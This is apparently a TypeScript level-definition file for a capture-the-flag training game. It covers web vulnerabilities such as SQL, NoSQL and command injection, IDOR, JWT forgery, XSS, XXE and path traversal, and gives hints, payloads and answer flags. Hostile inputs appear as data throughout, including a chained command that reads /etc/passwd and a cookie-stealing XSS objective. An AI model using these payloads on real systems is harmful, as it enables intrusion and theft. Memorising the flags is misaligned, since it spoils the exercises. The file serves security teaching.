import { Level } from '.';

export const web: Level[] = [
  {
    id: '5',
    title: 'SQL Injection',
    category: 'Web Exploitation',
    description:
      'The login form at /login does not sanitize user input. Bypass authentication using a classic SQLi payload.',
    objective: "Submit the SQLi payload in the password field to bypass authentication.",
    target: 'http://target/login',
    type: 'web',
    flag: 'FLAG{sqli_auth_bypass}',
    xp: 100,
    hints: ["Try the payload: ' OR '1'='1", 'A tautology makes the WHERE clause always true.'],
    webComponent: {
      type: 'sqli-login',
      data: {
        url: 'http://target/login',
        fields: ['username', 'password'],
        magic: "' OR '1'='1",
      },
    },
  },
  {
    id: '6',
    title: 'IDOR',
    category: 'Web Exploitation',
    description:
      'The profile page at /profile?id=102 returns your data, but it does not enforce authorization. Access an admin account.',
    objective: 'Change the id parameter to access the first user profile.',
    target: 'http://target/profile?id=102',
    type: 'web',
    flag: 'FLAG{idor_horizontal_privesc}',
    xp: 100,
    hints: ['Try changing id=102 to id=1', 'IDs are sequential integers.'],
    webComponent: {
      type: 'idor-profile',
      data: {
        url: 'http://target/profile?id=102',
        currentId: '102',
        targetId: '1',
      },
    },
  },
  {
    id: '7',
    title: 'Cookie Tampering',
    category: 'Web Exploitation',
    description:
      'The role cookie is base64 encoded. Decode it, change your privileges, and resubmit.',
    objective: 'Modify the base64 role cookie so it decodes to "admin".',
    target: 'http://target/admin',
    type: 'web',
    flag: 'FLAG{cookie_admin_baked}',
    xp: 100,
    hints: ['Decode dXNlcg== with base64 -d', 'Re-encode admin and set the cookie.'],
    webComponent: {
      type: 'cookie-editor',
      data: {
        url: 'http://target/admin',
        cookies: [{ name: 'role', value: 'dXNlcg==' }],
        targetDecoded: 'admin',
      },
    },
  },
  {
    id: '12',
    title: 'API Enumeration',
    category: 'Web API',
    description:
      'An internal API endpoint is not listed in the documentation but still responds to requests.',
    objective: 'Use curl to call the hidden internal config endpoint.',
    target: 'http://target/api/v1/internal/config',
    type: 'terminal',
    flag: 'FLAG{api_internal_exposed}',
    xp: 100,
    hints: ['Try `curl http://target/api/v1/internal/config`', 'The response is a JSON object.'],
  },
  {
    id: '14',
    title: 'Command Injection',
    category: 'Web Exploitation',
    description:
      'A diagnostics page pings user-supplied IPs without validation. Inject a secondary command.',
    objective: 'Append a shell command to the ping input to dump /etc/passwd.',
    target: 'http://target/ping',
    type: 'web',
    flag: 'FLAG{cmd_injection_ping_pong}',
    xp: 100,
    hints: ['Use `;` to chain commands', 'Try `8.8.8.8; cat /etc/passwd`'],
    webComponent: {
      type: 'command-injection',
      data: {
        url: 'http://target/ping',
        payload: '8.8.8.8; cat /etc/passwd',
      },
    },
  },
  {
    id: '15',
    title: 'JWT None Algorithm',
    category: 'Web Exploitation',
    description:
      'The admin endpoint trusts JWTs signed with the "none" algorithm. Forge a token.',
    objective: 'Change the JWT header to alg=none and set admin=true in the payload.',
    target: 'http://target/api/admin',
    type: 'web',
    flag: 'FLAG{jwt_none_algorithm}',
    xp: 100,
    hints: ['Set header: {"alg":"none"}', 'Set payload: {"admin":true}'],
    webComponent: {
      type: 'jwt-editor',
      data: {
        url: 'http://target/api/admin',
        header: '{"alg":"HS256"}',
        payload: '{"admin":false,"user":"hacker"}',
      },
    },
  },
  {
    id: '34',
    title: 'Hidden Admin Profile',
    category: 'Web Exploitation',
    description:
      'The user profile endpoint is vulnerable to IDOR. The admin profile is hidden at an unexpected ID.',
    objective: 'Change the profile id to reveal the admin account and flag.',
    target: 'http://target/profile?id=500',
    type: 'web',
    flag: 'FLAG{idor_hidden_admin_id}',
    xp: 120,
    hints: ['Try sequential ids below 500', 'The admin profile is at id=0.'],
    webComponent: {
      type: 'idor-profile',
      data: {
        url: 'http://target/profile?id=500',
        currentId: '500',
        targetId: '0',
      },
    },
  },
  {
    id: '17',
    title: 'XSS Stealer',
    category: 'Web Exploitation',
    description:
      'A comment box is vulnerable to stored XSS. Exfiltrate an admin cookie.',
    objective: 'Inject a script tag that sends document.cookie to an attacker server.',
    target: 'http://target/comments',
    type: 'web',
    flag: 'FLAG{xss_cookie_stealer}',
    xp: 100,
    hints: ['Use `<script>`', 'Reference `document.cookie` inside the script.'],
    webComponent: {
      type: 'xss-comment',
      data: {
        url: 'http://target/comments',
      },
    },
  },
  {
    id: '22',
    title: 'XXE - XML External Entity',
    category: 'Web Exploitation',
    description:
      'An API imports XML without disabling external entities. Read internal files through XML.',
    objective:
      'Submit an XML payload with a DOCTYPE and an external entity to read /etc/passwd.',
    target: 'http://target/api/import',
    type: 'terminal',
    flag: 'FLAG{xxe_internal_leak}',
    xp: 100,
    hints: [
      'Use `curl -X POST -d "<payload>" http://target/api/import`',
      'Reference a SYSTEM entity to load file:///etc/passwd.',
    ],
  },
  {
    id: '23',
    title: 'LFI - Local File Inclusion',
    category: 'Web Exploitation',
    description:
      'A document viewer loads files based on a file parameter. Traverse directories to read system files.',
    objective:
      'Exploit path traversal in the file parameter to retrieve /etc/passwd.',
    target: 'http://target/download?file=',
    type: 'terminal',
    flag: 'FLAG{lfi_path_traversal}',
    xp: 100,
    hints: [
      'Try `curl "http://target/download?file=....//....//etc/passwd"`',
      'Use `../` or `....//` sequences to escape the webroot.',
    ],
  },
  {
    id: '24',
    title: 'NoSQL Injection',
    category: 'Web Exploitation',
    description:
      'The NoSQL login query trusts JSON operators. Bypass authentication with a JSON payload.',
    objective:
      'Send a JSON body with an operator like {"$ne": null} to bypass the login.',
    target: 'http://target/nosql-login',
    type: 'terminal',
    flag: 'FLAG{nosql_operator_bypass}',
    xp: 100,
    hints: [
      'Use `curl -X POST -H "Content-Type: application/json" -d \'{"username":{"$ne":null}}\' http://target/nosql-login`',
      'NoSQL operators start with a dollar sign.',
    ],
  },
];
